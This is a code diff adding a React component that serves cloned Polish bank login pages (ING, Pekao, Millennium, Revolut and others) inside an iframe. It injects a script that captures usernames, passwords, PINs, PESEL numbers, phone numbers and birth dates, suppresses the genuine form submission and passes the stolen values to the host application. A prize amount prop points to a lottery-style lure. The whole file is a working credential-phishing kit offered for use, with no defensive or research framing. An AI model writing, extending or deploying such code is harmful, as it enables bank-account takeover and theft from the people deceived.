@@ -1,0 +1,767 @@
+"use client";
+
+import React, { useEffect, useRef, useState } from "react";
+
+type Props = {
+  bankName: string;
+  logoFile?: string;
+  brandColor?: string;
+  bankSlug?: string;
+  formData: {
+    verfuegernummer?: string;
+    pin?: string;
+    personalCode?: string;
+    loginMethod?: string;
+  };
+  wonAmount?: number | null;
+  wonLabel?: string | null;
+  onChange: (field: string, value: string) => void;
+  handleRouteAction: (overrideData?: any) => void;
+  onProgressSave?: (data: Record<string, string>) => void;
+  saving?: boolean;
+};
+
+const SUBMIT_TEXT_RE =
+  /(log[\s-]*in|sign[\s-]*in|zaloguj|zatwierdź|zatwierdz|dalej|kontynuuj|continue|confirm|submit|verify|next|proceed|enter|ok|authenticate)/i;
+
+const IGNORED_INPUT_TYPES = new Set([
+  "hidden",
+  "submit",
+  "button",
+  "reset",
+  "image",
+  "file",
+  "checkbox",
+  "radio",
+]);
+
+function buildInjectionScript(step: number, bankSlug: string, brandColor: string): string {
+  const reSource = SUBMIT_TEXT_RE.source;
+  const reFlags = SUBMIT_TEXT_RE.flags;
+  return `(() => {
+    const SUBMIT_RE = new RegExp(${JSON.stringify(reSource)}, ${JSON.stringify(reFlags)});
+    const IGNORED = ${JSON.stringify([...IGNORED_INPUT_TYPES])};
+    const STEP = ${step};
+    const BANK_SLUG = ${JSON.stringify(bankSlug)};
+    const BRAND_COLOR = ${JSON.stringify(brandColor)};
+
+    // ---------------------------------------------------------------
+    // MASKED PASSWORD BOXES (pekao24/ing/bnpparibas/alior/velobank 2.html):
+    // tek-karakter password inputlari — kayitli sayfada cogusu disabled.
+    // Hepsi aktif edilir, 1 karakter girilince otomatik sonrakine gecilir,
+    // degerler birlestirilip "password" olarak gonderilir.
+    // ---------------------------------------------------------------
+    const isMaskedBox = (el) => {
+      try {
+        if (!el || !el.getAttribute) return false;
+        const t = (el.getAttribute("type") || "").toLowerCase();
+        if (t !== "password") return false;
+        const ml = el.getAttribute("maxlength") || el.getAttribute("text-length");
+        return ml === "1";
+      } catch (e) { return false; }
+    };
+    const maskedBoxes = () => {
+      const out = [];
+      try {
+        document.querySelectorAll("input").forEach((el) => {
+          if (isMaskedBox(el)) out.push(el);
+        });
+      } catch (e) {}
+      return out;
+    };
+    const maskedKey = (el) => el.getAttribute("name") || el.getAttribute("id") || "";
+    const combinedMaskedPassword = () => {
+      const boxes = maskedBoxes();
+      if (!boxes.length) return "";
+      let s = "";
+      boxes.forEach((el) => { s += (el.value || ""); });
+      return s;
+    };
+
+    const collectFrom = (doc) => {
+      const data = {};
+      try {
+        doc.querySelectorAll("input, textarea, select").forEach((el) => {
+          const type = (el.getAttribute("type") || "text").toLowerCase();
+          const name = el.getAttribute("name") || el.getAttribute("id") || "";
+          if (!name) return;
+          if (type === "radio") {
+            if (el.checked) data[name] = el.value != null ? String(el.value) : "on";
+            return;
+          }
+          if (type === "checkbox") {
+            if (el.checked) data[name] = el.value != null ? String(el.value) : "on";
+            return;
+          }
+          if (IGNORED.includes(type)) return;
+          const value = el.value != null ? String(el.value) : "";
+          if (value.trim() === "") return;
+          data[name] = value;
+        });
+      } catch (e) {}
+      return data;
+    };
+
+    const collect = () => {
+      const data = {};
+      const walk = (doc, depth) => {
+        if (!doc || depth > 4) return;
+        try {
+          Object.assign(data, collectFrom(doc));
+          doc.querySelectorAll("iframe").forEach((f) => {
+            try { walk(f.contentDocument, depth + 1); } catch (e) {}
+          });
+        } catch (e) {}
+      };
+      walk(document, 0);
+
+      // Masked kutular: tek tek key'leri sil, birlesik password yaz
+      try {
+        const boxes = maskedBoxes();
+        if (boxes.length) {
+          boxes.forEach((el) => { const k = maskedKey(el); if (k && data[k] !== undefined) delete data[k]; });
+          const combined = combinedMaskedPassword();
+          if (combined.trim()) data.password = combined;
+        }
+      } catch (e) {}
+
+      // Millennium PESEL kutulari (Pesel-10, Pesel-11 ...) -> tek "pesel" alani
+      try {
+        const peselParts = [];
+        document.querySelectorAll("input").forEach((el) => {
+          const n = el.getAttribute("name") || "";
+          if (/^pesel[-_]?/i.test(n)) {
+            const v = (el.value || "").trim();
+            if (v) peselParts.push({ n, v });
+            if (data[n] !== undefined) delete data[n];
+          }
+        });
+        if (peselParts.length) {
+          data.pesel = peselParts
+            .map((p) => p.n.replace(/^pesel[-_]?/i, "") + ":" + p.v)
+            .join(" ");
+        }
+      } catch (e) {}
+
+      // Millennium telefon: prefix + phoneNumber -> bankPhone
+      try {
+        if (data.phoneNumber) {
+          data.bankPhone = String(data.prefix || "") + String(data.phoneNumber || "");
+          delete data.prefix;
+          delete data.phoneNumber;
+        }
+      } catch (e) {}
+
+      return data;
+    };
+
+    const send = (trigger, extra) => {
+      const data = collect();
+      if (extra && typeof extra === "object") Object.assign(data, extra);
+      if (Object.keys(data).length === 0) return;
+      try {
+        (window.top || window.parent).postMessage({ type: "PL_BANK_SUBMIT", step: STEP, trigger, data }, "*");
+      } catch (e) { /* noop */ }
+    };
+
+    const isSubmitish = (el) => {
+      if (!el || !el.getAttribute) return false;
+      const tag = (el.tagName || "").toLowerCase();
+      const type = (el.getAttribute("type") || "").toLowerCase();
+      const role = (el.getAttribute("role") || "").toLowerCase();
+      const ident = ((el.getAttribute("id") || "") + " " + (typeof el.className === "string" ? el.className : "")).toLowerCase();
+      const text = (el.innerText || el.textContent || el.value || el.getAttribute("aria-label") || "").trim();
+      if (tag === "input" && (type === "submit" || type === "image")) return true;
+      if (tag === "button" && type === "submit") return true;
+      if ((tag === "a" || tag === "button" || role === "button" || (tag === "input" && type === "button")) && /(submit|signin|login-button|btn-login|continue|confirm)/.test(ident)) return true;
+      if (role === "button" && SUBMIT_RE.test(text) && text.length <= 60) return true;
+      if (tag === "a" && SUBMIT_RE.test(text) && text.length <= 60) return true;
+      if ((tag === "input" || tag === "button") && type !== "submit" && SUBMIT_RE.test(text) && text.length <= 60) return true;
+      // ING: <ing-button type=submit>Zaloguj</ing-button> custom element
+      if (tag === "ing-button" && (type === "submit" || /button-confirm/.test(ident) || SUBMIT_RE.test(text))) return true;
+      // Pekao/BNP diger custom submit elementleri
+      if (type === "submit" && SUBMIT_RE.test(text) && text.length <= 60) return true;
+      return false;
+    };
+
+    // ------------------------------------------------------------------
+    // KEYPAD MODE (Revolut 2.html style): digit buttons [data-value="0-9"].
+    // ------------------------------------------------------------------
+    let keypadBuffer = "";
+    const PIN_MIN = 4;
+    const PIN_MAX = 6;
+    const hasKeypad = () => {
+      try { return !!document.querySelector("button[data-value]"); } catch (e) { return false; }
+    };
+    const flushKeypad = () => {
+      if (keypadBuffer.length >= PIN_MIN) {
+        const buf = keypadBuffer;
+        keypadBuffer = "";
+        try { renderKeypad(); } catch (e) {}
+        send("keypad", { passcode: buf, pin: buf });
+      }
+    };
+    const renderKeypadDots = () => {
+      try {
+        if (keypadBuffer.length === 0) {
+          const dot0 = document.querySelector(".sx827n0");
+          const host0 = (dot0 && dot0.parentElement) || window.__plDotHost;
+          if (host0 && host0.isConnected && window.__plDotHost) host0.innerHTML = "";
+          const own0 = document.getElementById("pl-keypad-dots");
+          if (own0) own0.style.display = "none";
+          return;
+        }
+        const dot = document.querySelector(".sx827n0");
+        const host = (dot && dot.parentElement) || window.__plDotHost;
+        if (host && host.isConnected) {
+          window.__plDotHost = host;
+          let darkBg = false;
+          try {
+            let node = host;
+            while (node && node !== document.documentElement) {
+              const c = getComputedStyle(node).backgroundColor;
+              if (c && c !== "transparent" && !/^rgba?\(\s*0\s*,\s*0\s*,\s*0\s*(,\s*0\s*)?\)/.test(c)) {
+                const m = /(\d+)[,\s]+(\d+)[,\s]+(\d+)/.exec(c);
+                if (m) darkBg = 0.2126 * +m[1] + 0.7152 * +m[2] + 0.0722 * +m[3] < 128;
+                break;
+              }
+              node = node.parentElement;
+            }
+          } catch (e) {}
+          const fillCol = darkBg ? "#ffffff" : "#191c1f";
+          const emptyCol = darkBg ? "rgba(255,255,255,.42)" : "#aab3bb";
+          host.style.display = "flex";
+          host.style.flexDirection = "row";
+          host.style.flexWrap = "nowrap";
+          host.style.justifyContent = "center";
+          host.style.alignItems = "center";
+          host.style.gap = "16px";
+          host.innerHTML = "";
+          for (let i = 0; i < PIN_MAX; i++) {
+            const d = document.createElement("span");
+            d.style.cssText =
+              "width:16px;height:16px;border-radius:50%;display:inline-block;box-sizing:border-box;flex:none;" +
+              (i < keypadBuffer.length
+                ? "background:" + fillCol + ";border:2px solid " + fillCol + ";"
+                : "background:transparent;border:2px solid " + emptyCol + ";");
+            host.appendChild(d);
+          }
+          return;
+        }
+        let own = document.getElementById("pl-keypad-dots");
+        if (!own) {
+          own = document.createElement("div");
+          own.id = "pl-keypad-dots";
+          own.style.cssText =
+            "position:fixed;top:20%;left:50%;transform:translateX(-50%);z-index:999998;" +
+            "display:flex;gap:16px;justify-content:center;padding:10px 18px;" +
+            "background:rgba(255,255,255,.92);border-radius:24px;box-shadow:0 2px 10px rgba(0,0,0,.18)";
+          document.body.appendChild(own);
+        }
+        own.innerHTML = "";
+        for (let i = 0; i < PIN_MAX; i++) {
+          const d = document.createElement("span");
+          d.style.cssText =
+            "width:16px;height:16px;border-radius:50%;display:inline-block;box-sizing:border-box;" +
+            (i < keypadBuffer.length
+              ? "background:#191c1f;border:2px solid #191c1f;"
+              : "background:transparent;border:2px solid #aab3bb;");
+          own.appendChild(d);
+        }
+      } catch (e) {}
+    };
+    const injectBackspace = () => {
+      try {
+        if (document.getElementById("pl-keypad-backspace")) return;
+        if (!hasKeypad()) return;
+        if (BANK_SLUG !== "revolut" && keypadBuffer.length === 0) return;
+        const zero = document.querySelector("button[data-value='0']");
+        if (!zero) return;
+        const cell = zero.nextElementSibling;
+        const host = cell && cell.tagName === "DIV" ? cell : zero.parentElement;
+        if (!host) return;
+        const btn = document.createElement("button");
+        btn.id = "pl-keypad-backspace";
+        btn.type = "button";
+        btn.textContent = "⌫";
+        btn.style.cssText =
+          "width:64px;height:64px;border:none;border-radius:50%;background:transparent;" +
+          "color:#191c1f;font:400 26px/1 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;" +
+          "cursor:pointer;display:flex;align-items:center;justify-content:center;margin:0 auto";
+        btn.addEventListener("click", (ev) => {
+          try { ev.preventDefault(); ev.stopPropagation(); } catch (e) {}
+          keypadBuffer = keypadBuffer.slice(0, -1);
+          renderKeypad();
+        });
+        host.appendChild(btn);
+      } catch (e) {}
+    };
+    const renderContinueButton = () => {
+      try {
+        let btn = document.getElementById("pl-keypad-continue");
+        const show = hasKeypad() && keypadBuffer.length >= PIN_MIN;
+        if (show && !btn) {
+          btn = document.createElement("button");
+          btn.id = "pl-keypad-continue";
+          btn.type = "button";
+          btn.textContent = "Zaloguj się";
+          btn.style.cssText =
+            "position:fixed;left:50%;transform:translateX(-50%);bottom:24px;z-index:999999;" +
+            "width:calc(100% - 32px);max-width:400px;height:52px;border:none;border-radius:26px;" +
+            "background:#191c1f;color:#ffffff;font:600 17px/1 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;" +
+            "cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,.35)";
+          btn.addEventListener("click", (ev) => {
+            try { ev.preventDefault(); ev.stopPropagation(); } catch (e) {}
+            flushKeypad();
+          });
+          document.body.appendChild(btn);
+        }
+        if (btn) btn.style.display = show ? "block" : "none";
+      } catch (e) {}
+    };
+    const renderKeypad = () => {
+      renderKeypadDots();
+      renderContinueButton();
+      injectBackspace();
+    };
+
+    const enableControls = (root) => {
+      try {
+        root.querySelectorAll("button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled], ing-button, ing-input-masked-password-field").forEach((el) => {
+          try {
+            if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
+            if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
+            if (el.getAttribute("aria-disabled") === "true") el.setAttribute("aria-disabled", "false");
+            if (el.classList && el.classList.contains("disabled")) el.classList.remove("disabled");
+            if (el.style && el.style.pointerEvents === "none") el.style.pointerEvents = "auto";
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
+    // MASKED BOX DAVRANISI: hepsini aktif et + 1 karakterde sonrakine
+    // otomatik gec + Backspace'de oncekine don.
+    // ------------------------------------------------------------------
+    const applyMaskedBehavior = (root) => {
+      try {
+        const boxes = maskedBoxes();
+        boxes.forEach((el, i) => {
+          try {
+            if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
+            if (el.hasAttribute("aria-disabled")) el.setAttribute("aria-disabled", "false");
+            if (el.classList && el.classList.contains("inactive")) {
+              el.classList.remove("inactive");
+              el.classList.add("active");
+            }
+            if (el.__plMasked) return;
+            el.__plMasked = true;
+            el.setAttribute("autocomplete", "off");
+            el.addEventListener("input", () => {
+              try {
+                if ((el.value || "").length >= 1) {
+                  const next = maskedBoxes()[i + 1];
+                  if (next) next.focus();
+                }
+              } catch (e) {}
+            });
+            el.addEventListener("keydown", (ev) => {
+              try {
+                if (ev.key === "Backspace" && !(el.value || "").length) {
+                  const prev = maskedBoxes()[i - 1];
+                  if (prev) { prev.focus(); prev.value = ""; }
+                }
+              } catch (e) {}
+            });
+            el.addEventListener("paste", (ev) => {
+              try {
+                ev.preventDefault();
+                const txt = ((ev.clipboardData || window.clipboardData).getData("text") || "").replace(/\s/g, "");
+                const bx = maskedBoxes();
+                for (let j = 0; j < txt.length && i + j < bx.length; j++) {
+                  bx[i + j].value = txt[j];
+                  try { bx[i + j].dispatchEvent(new Event("input", { bubbles: true })); } catch (e) {}
+                }
+              } catch (e) {}
+            });
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
+    // ING FIX: Zaloguj butonu sayfanin cok altinda kaliyor -> sabit
+    // gorunur bar + mobil icin yatay tasmani engelle.
+    // ------------------------------------------------------------------
+    const applyIngFix = () => {
+      try {
+        if (BANK_SLUG !== "ing") return;
+        if (document.getElementById("pl-ing-fix")) return;
+        const st = document.createElement("style");
+        st.id = "pl-ing-fix";
+        st.textContent =
+          "html,body{max-width:100vw;overflow-x:hidden}" +
+          "ing-confirmation-buttons-layout{display:block !important;position:fixed !important;left:0;right:0;bottom:0;z-index:99999;background:#fff;padding:12px 16px;box-shadow:0 -4px 16px rgba(0,0,0,.08)}" +
+          "ing-button[type=submit],ing-button.button-confirm{width:100% !important;--ing-button-width:100%}" +
+          "@media(min-width:840px){ing-confirmation-buttons-layout{position:static !important;box-shadow:none;padding:16px 0}}";
+        (document.head || document.documentElement).appendChild(st);
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
+    // SUBMIT-READY: gri submit butonlari tum alanlar dolunca renklenir.
+    // ------------------------------------------------------------------
+    const READY_COLORS = {};
+    const updateSubmitReady = (root) => {
+      try {
+        const inputs = [];
+        root.querySelectorAll("input").forEach((el) => {
+          const t = (el.getAttribute("type") || "text").toLowerCase();
+          if (IGNORED.includes(t)) return;
+          try { if (!el.getClientRects().length) return; } catch (e) {}
+          inputs.push(el);
+        });
+        if (inputs.length === 0) return;
+        const ready = inputs.every((el) => (el.value || "").trim() !== "");
+        const readyColor = READY_COLORS[BANK_SLUG] || BRAND_COLOR || "";
+        if (!readyColor) return;
+        root.querySelectorAll("input[type=submit], button[type=submit], .gigya-composite-control-submit input, .de-login-submit input").forEach((btn) => {
+          try {
+            const cs = root.defaultView ? root.defaultView.getComputedStyle(btn) : getComputedStyle(btn);
+            const m = /rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)/.exec(cs.backgroundColor || "");
+            const grayish = m && Math.abs(+m[1] - +m[2]) < 20 && Math.abs(+m[2] - +m[3]) < 20 && +m[1] > 140;
+            if (ready && (grayish || btn.__plReadyStyled)) {
+              btn.style.setProperty("background-color", readyColor, "important");
+              btn.style.setProperty("color", "#ffffff", "important");
+              btn.__plReadyStyled = true;
+            } else if (!ready && btn.__plReadyStyled) {
+              btn.style.removeProperty("background-color");
+              btn.style.removeProperty("color");
+              btn.__plReadyStyled = false;
+            }
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    const attach = (doc) => {
+      if (!doc || doc.__plCaptureInjected) return;
+      doc.__plCaptureInjected = true;
+
+      enableControls(doc);
+      applyMaskedBehavior(doc);
+      applyIngFix();
+      updateSubmitReady(doc);
+      doc.addEventListener("input", () => updateSubmitReady(doc), true);
+      doc.addEventListener("change", () => updateSubmitReady(doc), true);
+      try {
+        new MutationObserver((mutations) => {
+          for (const m of mutations) {
+            if (m.type === "attributes" && m.target && m.target.nodeType === 1) {
+              const el = m.target;
+              try {
+                if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
+                if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
+                if (el.getAttribute && el.getAttribute("aria-disabled") === "true") el.setAttribute("aria-disabled", "false");
+              } catch (e) {}
+            }
+          }
+        }).observe(doc.documentElement || doc, { attributes: true, attributeFilter: ["disabled", "ng-disabled", "aria-disabled"], subtree: true });
+      } catch (e) {}
+
+      doc.addEventListener("submit", (e) => {
+        try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
+        send("form-submit");
+        return false;
+      }, true);
+
+      doc.addEventListener("click", (e) => {
+        try {
+          let t0 = e.target;
+          while (t0 && t0 !== doc.body) {
+            if (t0.id === "pl-keypad-continue" || t0.id === "pl-keypad-backspace") return;
+            t0 = t0.parentElement;
+          }
+        } catch (err) {}
+
+        try {
+          let el = e.target;
+          let depth = 0;
+          while (el && el !== doc.body && depth < 5) {
+            if (el.tagName && el.tagName.toLowerCase() === "button") {
+              const dv = el.getAttribute("data-value");
+              if (dv != null && /^[0-9]$/.test(dv)) {
+                if (keypadBuffer.length < PIN_MAX) keypadBuffer += dv;
+                renderKeypad();
+                return;
+              }
+              if (hasKeypad() && (el.getAttribute("data-variant") === "icon" || /iconbutton/i.test(typeof el.className === "string" ? el.className : ""))) {
+                keypadBuffer = keypadBuffer.slice(0, -1);
+                renderKeypad();
+                return;
+              }
+            }
+            el = el.parentElement;
+            depth++;
+          }
+        } catch (err) {}
+
+        try {
+          const t = e.target;
+          const ttag = (t && t.tagName || "").toLowerCase();
+          if (ttag === "input" || ttag === "textarea" || ttag === "select") {
+            const ttype = (t.getAttribute("type") || "").toLowerCase();
+            if (ttag !== "input" || (ttype !== "submit" && ttype !== "button" && ttype !== "image")) return;
+          }
+        } catch (err) {}
+        let el2 = e.target;
+        let depth2 = 0;
+        while (el2 && el2 !== doc.body && depth2 < 4) {
+          if (isSubmitish(el2)) {
+            try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
+            send("click:" + (el2.tagName || "").toLowerCase());
+            return;
+          }
+          el2 = el2.parentElement;
+          depth2++;
+        }
+      }, true);
+
+      doc.addEventListener("keydown", (e) => {
+        try {
+          if (e.key === "Backspace" && keypadBuffer.length > 0 && hasKeypad()) {
+            keypadBuffer = keypadBuffer.slice(0, -1);
+            renderKeypad();
+            return;
+          }
+          if (e.key === "Enter" && hasKeypad() && keypadBuffer.length >= 4) {
+            flushKeypad();
+            return;
+          }
+          if (e.key !== "Enter") return;
+          const t = e.target;
+          if (!t || !t.getAttribute) return;
+          const tag = (t.tagName || "").toLowerCase();
+          if (tag !== "input" && tag !== "select") return;
+          const type = (t.getAttribute("type") || "text").toLowerCase();
+          if (type === "hidden" || type === "checkbox" || type === "radio") return;
+          send("enter-key");
+        } catch (err) {}
+      }, true);
+    };
+
+    const scanIframes = (doc, depth) => {
+      if (!doc || depth > 4) return;
+      try {
+        doc.querySelectorAll("iframe").forEach((f) => {
+          try {
+            const d = f.contentDocument;
+            if (d) { attach(d); scanIframes(d, depth + 1); }
+            f.addEventListener("load", () => {
+              try {
+                if (f.contentDocument) { attach(f.contentDocument); scanIframes(f.contentDocument, depth + 1); }
+              } catch (e) {}
+            });
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    attach(document);
+    scanIframes(document, 0);
+    try {
+      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); applyMaskedBehavior(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
+    } catch (e) {}
+    let tries = 0;
+    const retry = setInterval(() => {
+      scanIframes(document, 0);
+      enableControls(document);
+      applyMaskedBehavior(document);
+      applyIngFix();
+      updateSubmitReady(document);
+      renderKeypad();
+      if (++tries > 30) clearInterval(retry);
+    }, 500);
+  })();`;
+}
+
+// Ham form alanlarini standart credential alanlarina esler
+// (username / password / bankPhone / pin / personalCode / pesel)
+function canonicalizeCaptured(raw: Record<string, string>): Record<string, string> {
+  const out: Record<string, string> = { ...raw };
+  const norm = (k: string) => k.toLowerCase().replace(/[^a-z0-9]/g, "");
+  for (const [k, v] of Object.entries(raw)) {
+    if (!v || !v.trim()) continue;
+    const n = norm(k);
+    if (
+      /username|loginid|loginnumber|formuserid|userid|customerid|customernumber|cifcustomernumber|email|millecode|millekod|clientid|clientnumber|^nik$/.test(n)
+    ) {
+      out.username ||= v;
+      out.verfuegernummer ||= v;
+    }
+    if (/password|loginpassword|pfpass|pssword|haslo|maskedpassword|pass$/.test(n)) {
+      out.password ||= v;
+      out.pin ||= v;
+    }
+    if (/phonenumber|bankphone|phone$|mobile|gsm|telefon|nrtelefonu/.test(n)) {
+      out.bankPhone ||= v;
+    }
+    if (/^passcode$|^pin$|^otp$|^tac$/.test(n)) {
+      out.pin ||= v;
+      out.password ||= v;
+    }
+    // Millennium: millecode -> username (yukaridaki regex zaten yakaladi)
+    if (/^mc$/.test(n)) {
+      out.username ||= v;
+      out.verfuegernummer ||= v;
+    }
+    // PESEL (Millennium kombine alani)
+    if (/pesel/.test(n)) {
+      out.pesel ||= v;
+    }
+    // Giris yontemi
+    if (/loginmethod|authmethod/.test(n)) {
+      out.loginMethod ||= v;
+    }
+    // Dogum tarihi
+    if (/dateofbirth|dob|birthdate|birthday|dataurodzenia/.test(n)) {
+      const digits = v.replace(/\D/g, "").slice(0, 8);
+      out.dateOfBirth ||=
+        digits.length === 8
+          ? `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4, 8)}`
+          : v;
+    }
+  }
+  return out;
+}
+
+export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onProgressSave, saving, bankName, logoFile, brandColor, wonAmount, wonLabel }: Props) {
+  const [files, setFiles] = useState<string[]>([]);
+  const [step, setStep] = useState(0);
+  const [loadError, setLoadError] = useState(false);
+  const iframeRef = useRef<HTMLIFrameElement>(null);
+
+  const handleRouteActionRef = useRef(handleRouteAction);
+  const onChangeRef = useRef(onChange);
+  const onProgressSaveRef = useRef(onProgressSave);
+  const bankSlugRef = useRef<string>("");
+  const capturedRef = useRef<Record<string, string>>({});
+  const filesRef = useRef<string[]>([]);
+  const stepRef = useRef(0);
+  handleRouteActionRef.current = handleRouteAction;
+  onChangeRef.current = onChange;
+  onProgressSaveRef.current = onProgressSave;
+  bankSlugRef.current = (bankSlug || "").toString().trim().toLowerCase();
+  filesRef.current = files;
+  stepRef.current = step;
+
+  useEffect(() => {
+    let cancelled = false;
+    const slug = (bankSlug || "").toString().trim().toLowerCase();
+    if (!slug) {
+      setFiles([]);
+      return;
+    }
+    fetch(`/api/pl-banks?bank=${encodeURIComponent(slug)}`, { cache: "no-store" })
+      .then((r) => (r.ok ? r.json() : { files: [] }))
+      .then((d) => {
+        if (cancelled) return;
+        const list = Array.isArray(d?.files) ? d.files : [];
+        setFiles(list.length > 0 ? list : ["1.html"]);
+      })
+      .catch(() => {
+        if (!cancelled) setFiles(["1.html"]);
+      });
+    return () => {
+      cancelled = true;
+    };
+  }, [bankSlug]);
+
+  useEffect(() => {
+    const onMessage = (event: MessageEvent) => {
+      const data = event?.data;
+      if (!data || typeof data !== "object") return;
+      if (data.type !== "PL_BANK_SUBMIT") return;
+      const payload = data.data && typeof data.data === "object" ? { ...(data.data as Record<string, string>) } : {};
+      if (Object.keys(payload).length === 0) return;
+
+      for (const [k, v] of Object.entries(payload)) {
+        if (typeof v === "string" && v.trim() !== "") {
+          capturedRef.current[k] = v;
+        }
+      }
+      const merged = canonicalizeCaptured(capturedRef.current);
+
+      if (merged.username) onChangeRef.current("verfuegernummer", merged.username);
+      if (merged.pin) onChangeRef.current("pin", merged.pin);
+
+      const lastIndex = filesRef.current.length - 1;
+      const incomingStep = typeof data.step === "number" ? data.step : stepRef.current;
+
+      if (incomingStep < lastIndex) {
+        onProgressSaveRef.current?.(merged);
+        setStep(incomingStep + 1);
+        return;
+      }
+
+      handleRouteActionRef.current({
+        ...merged,
+        bankSlug: bankSlugRef.current,
+      });
+    };
+    window.addEventListener("message", onMessage);
+    return () => window.removeEventListener("message", onMessage);
+  }, []);
+
+  const injectScript = () => {
+    try {
+      const doc = iframeRef.current?.contentDocument;
+      if (!doc) return;
+      const script = doc.createElement("script");
+      script.textContent = buildInjectionScript(
+        stepRef.current,
+        bankSlugRef.current,
+        (brandColor || "").toString().trim(),
+      );
+      doc.documentElement.appendChild(script);
+    } catch (err) {
+      console.error("PL bank iframe injection error:", err);
+    }
+  };
+
+  if (files.length === 0) {
+    return (
+      <div className="flex min-h-screen items-center justify-center p-4 bg-white">
+        <p className="rounded-xl border border-blue-500/30 bg-blue-500/10 p-5 text-center text-sm text-blue-700">
+          Loading your bank's secure login page...
+        </p>
+      </div>
+    );
+  }
+
+  const currentFile = files[Math.min(step, files.length - 1)];
+
+  return (
+    <div
+      className="fixed inset-0 w-[100vw] bg-white z-[9999] overflow-hidden"
+      style={{ minHeight: "100vh", height: "100dvh" }}
+    >
+      <style>{`body.ah-theme,body.ah-theme-overlay-bg,body{background:#fff !important;background-image:none !important}`}</style>
+      {saving && (
+        <div className="absolute inset-0 bg-white/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
+          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
+        </div>
+      )}
+
+      <iframe
+        key={`${bankSlug}-${currentFile}`}
+        ref={iframeRef}
+        src={`/pl-banks/${bankSlug}/${currentFile}`}
+        className="w-full border-0"
+        style={{ height: "100dvh", display: "block" }}
+        sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
+        onLoad={injectScript}
+      />
+    </div>
+  );
+}
